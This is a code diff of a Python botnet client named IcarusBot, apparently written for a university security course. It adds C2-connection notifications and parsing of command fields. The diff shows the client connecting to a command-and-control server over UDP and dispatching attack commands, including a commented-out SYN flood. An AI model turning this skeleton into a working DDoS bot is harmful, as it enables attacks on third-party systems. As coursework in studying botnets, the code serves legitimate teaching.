@@ -64,6 +64,7 @@ class IcarusBot:
                 time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
             print("nameserver found")
+            notification("CONNECTED")
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
@@ -121,6 +122,9 @@ class IcarusBot:
                 request_type = jsonMsg['request']
                 attack_type = jsonMsg['attack']
                 target_ip = jsonMsg['targetIP']
+                # These are contained in all packets, irrespective of status/attack/stop call.
+                ports = jsonmsg['ports']
+                runtime = jsonMsg['runtime']
                 response = ''
                 # Through each if statement, we specify what we're going to do. The logic is contained in each if.
                 if request_type == 'status':
@@ -136,6 +140,7 @@ class IcarusBot:
                 elif request_type == 'attack':
                     # TODO: Implement attacks here
                     # TODO: Number of packets to send?
+                    # Angus: We just keep running until a stop attack is issued.
                     if attack_type == 'SYN_FLOOD':
                         #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, 1))
                         #attack_thread.start()
@@ -181,9 +186,15 @@ def notification(action):
     if action == "STARTED":
         title = "ICARUS BOT STARTED"
         body = "I NOW HAVE FULL ACCESS TO YOUR SYSTEMS (COMS4507)"
+    elif action == "CONNECTED":
+        title = "ICARUS CONNECTED TO C2 SERVER"
+        body = "NOTHING TO WORRY ABOUT"
     elif action == "ATTACKING":
         title = "ICARUS BOT ATTACKING"
-        body = "The bot gave in to peer pressure and is attacking something"
+        body = "I AM ATTACKING. PLEASE IGNORE."
+    elif action == "STOPPED":
+        title = "ICARUS IS DONE ATTACKING"
+        body = "I AM DONE ATTACKING. PLEASE IGNORE."
     else:
         title = "ICARUS BOT CALLED OFF"
         body = "The bot finished it's job"
